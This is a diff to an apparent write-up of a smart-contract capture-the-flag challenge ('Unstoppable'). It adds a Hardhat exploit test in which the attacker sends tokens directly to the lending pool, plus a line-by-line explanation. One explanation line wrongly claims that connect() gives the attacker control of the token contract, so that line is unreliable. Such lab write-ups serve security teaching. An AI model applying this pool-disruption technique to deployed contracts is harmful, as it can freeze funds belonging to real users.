@@ -41,12 +41,29 @@ now we need to inspect variable poolBalance:
 
 ```javascript
 it("Exploit", async function () {
-	await this.token.transfer(
+	const TokenContractExploit = this.token.connect(attacker);
+	await TokenContractExploit.transfer(
 		this.pool.address,
-		INITIAL_ATTACKER_TOKEN_BALANCE,
-		{
-			from: attacker,
-		}
+		INITIAL_ATTACKER_TOKEN_BALANCE
 	);
 });
 ```
+
+## Explanation
+
+```javascript
+const TokenContractExploit = this.token.connect(attacker);
+```
+
+    This line creates a new instance of the token contract (DamnValuableToken) connected to the attacker account.
+    It allows the attacker account to interact with the token contract, effectively gaining control over it.
+
+```javascript
+await TokenContractExploit.transfer(
+	this.pool.address,
+	INITIAL_ATTACKER_TOKEN_BALANCE
+);
+```
+
+    This line initiates a transfer of tokens from the attacker's controlled instance of the token contract to the lending contract (UnstoppableLender).
+    The transferred amount is INITIAL_ATTACKER_TOKEN_BALANCE, which is set to 100 tokens.
